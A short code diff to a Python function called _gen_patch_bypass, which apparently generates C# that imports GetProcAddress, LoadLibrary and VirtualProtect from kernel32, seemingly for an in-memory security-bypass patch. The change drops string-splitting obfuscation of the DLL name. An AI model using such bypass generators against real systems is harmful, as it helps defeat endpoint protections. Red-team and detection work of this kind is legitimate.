@@ -53,11 +53,11 @@ def _gen_patch_bypass() -> str:
         "using System;\n"
         "using System.Runtime.InteropServices;\n"
         f"public class {cs_class} {{\n"
-        '    [DllImport("ke"+"rnel"+"32")]\n'
+        '    [DllImport("kernel32")]\n'
         "    public static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
-        '    [DllImport("ke"+"rnel"+"32")]\n'
+        '    [DllImport("kernel32")]\n'
         "    public static extern IntPtr LoadLibrary(string n);\n"
-        '    [DllImport("ke"+"rnel"+"32")]\n'
+        '    [DllImport("kernel32")]\n'
         "    public static extern bool VirtualProtect("
         "IntPtr a, UIntPtr s, uint n, out uint o);\n"
         "}\n"
